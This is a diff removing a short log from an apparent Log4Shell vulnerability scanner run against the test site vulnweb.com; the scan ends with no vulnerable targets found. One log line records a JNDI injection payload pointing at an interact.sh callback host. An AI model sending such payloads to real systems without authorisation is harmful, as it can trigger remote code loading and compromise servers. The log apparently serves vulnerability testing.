@@ -1,8 +1,0 @@
-2022/02/12T11:59:24 - INFO - Setting up dnslog DNS callback provider
-2022/02/12T11:59:24 - INFO - Setting up interactsh DNS callback provider.
-2022/02/12T11:59:24 - INFO - Executing the script with the following arguments: ['-u', 'vulnweb.com']
-2022/02/12T11:59:25 - INFO - Starting scan.
-2022/02/12T11:59:25 - INFO - URL: vulnweb.com - PAYLOAD: ${jndi:ldap://vulnweb.com.31666i1549gi4v2ef7tl5404035ym114s.interact.sh/35hju1y}.
-2022/02/12T11:59:25 - ERROR - Invalid URL 'vulnweb.com': No scheme supplied. Perhaps you meant http://vulnweb.com?
-2022/02/12T11:59:25 - INFO - Scan completed. Waiting for DNS repsonse.
-2022/02/12T11:59:30 - INFO - No vulnerable targets found.
